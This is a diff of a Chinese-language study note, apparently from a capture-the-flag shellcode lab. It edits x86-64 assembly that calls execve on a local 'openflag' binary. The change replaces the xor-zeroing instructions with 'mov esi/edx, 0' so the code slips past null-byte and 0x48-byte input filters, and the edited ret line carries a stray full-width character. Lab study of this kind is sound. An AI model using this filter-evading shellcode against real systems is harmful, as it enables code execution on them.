@@ -237,6 +237,7 @@ objcopy --dump-section .text=shellcode.raw shellcode.o
 gcc shellcode.o -o shellcode.elf #可执行代码,实际上也不需要它就是了
 ```
 代码如下:<br>
+
 ```
 BITS 64
 
@@ -248,11 +249,13 @@ main:
 
 get_address:
     pop rdi                     ; 将字符串地址弹出到RDI中
-    xor rsi, rsi                ; 清空RSI
-    xor rdx, rdx                ; 清空RDX
+    ;xor rsi, rsi                ; 清空RSI
+    ;xor rdx, rdx                ; 清空RDX ，可绕过\x00字符检验
+    mov esi, 0                  ; 
+    mov edx, 0                  ;可绕过0x48字符检验
     mov al, 0x3b                ; syscall编号execve
     syscall                     ; 执行系统调用
-    ret 
+    ret                         ； 不
 call_shellcode:
     call get_address            ; get string addr
     db '/home/hacker/Shellcode/level3/openflag'               ;
